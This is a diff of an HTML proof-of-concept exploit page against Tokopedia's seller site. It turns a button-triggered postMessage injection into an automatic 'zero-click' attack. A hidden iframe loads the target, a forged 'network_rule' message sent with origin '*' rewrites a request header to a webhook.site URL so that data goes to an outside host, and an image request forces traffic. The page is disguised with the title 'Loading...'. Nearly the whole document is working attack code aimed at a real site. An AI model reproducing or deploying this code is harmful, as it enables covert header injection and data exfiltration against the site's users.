@@ -1,46 +1,48 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>PoC Check</title>
-    <style>
-        body { background-color: #121212; color: #00ff00; font-family: monospace; text-align: center; padding-top: 100px; }
-        .box { border: 2px solid #00ff00; padding: 20px; display: inline-block; }
-        button { background: #00ff00; color: black; border: none; padding: 10px 20px; font-weight: bold; cursor: pointer; }
-    </style>
-</head>
+<head><title>Loading...</title></head>
 <body>
-    <div class="box">
-        <h1>[ SYSTEM READY ]</h1>
-        <p>Status: Exploit Loaded</p>
-        <button onclick="attack()">INJECT RULE</button>
-    </div>
+    <iframe id="target" src="https://shop-id.tokopedia.com/v1/list" style="display:none;"></iframe>
 
     <script>
-        function attack() {
-            console.log("Launching...");
-            const targetWin = window.open("https://shop-id.tokopedia.com", "_blank");
+        const targetFrame = document.getElementById('target');
+        const webhook = "https://webhook.site/60ce3310-1a67-444f-90e0-b1f91ae9881e";
 
-            setTimeout(function() {
-                if (targetWin) {
-                    targetWin.postMessage({
-                        source: "main_thread",
-                        eventName: "network_rule",
-                        data: [{
-                            ruleName: "final_test",
-                            global: true,
-                            conditions: [],
-                            handlers: [{
-                                handler: "replace",
-                                type: "header",
-                                field: "X-Pns-Referrer",
-                                value: "VULN_SUCCESS"
-                            }]
-                        }]
-                    }, "*");
-                    alert("Exploit Sent! Check Tokopedia Tab.");
-                }
-            }, 5000); // Kasih waktu 5 detik biar beneran ke-load
+        function sendExploit() {
+            console.log("Attempting Zero-Click Injection...");
+            
+            const payload = {
+                source: "main_thread",
+                eventName: "network_rule",
+                data: [{
+                    ruleName: "zero_click_exfil",
+                    global: true,
+                    conditions: [],
+                    handlers: [{
+                        handler: "replace",
+                        type: "header",
+                        field: "X-Pns-Referrer",
+                        value: webhook
+                    }]
+                }]
+            };
+
+            // Kirim ke semua frame yang berhasil ter-load
+            targetFrame.contentWindow.postMessage(payload, "*");
         }
+
+        // Jalankan otomatis saat halaman dibuka
+        targetFrame.onload = function() {
+            // Kasih jeda dikit biar SW siap
+            setTimeout(sendExploit, 2000);
+            
+            // Setelah injeksi, kita paksa fetch dari background (Zero-Click)
+            setTimeout(() => {
+                // Kita coba pemicu fetch lewat image tag ke domain target
+                const img = new Image();
+                img.src = "https://shop-id.tokopedia.com/v1/list?trigger=" + Math.random();
+            }, 4000);
+        };
     </script>
 </body>
 </html>
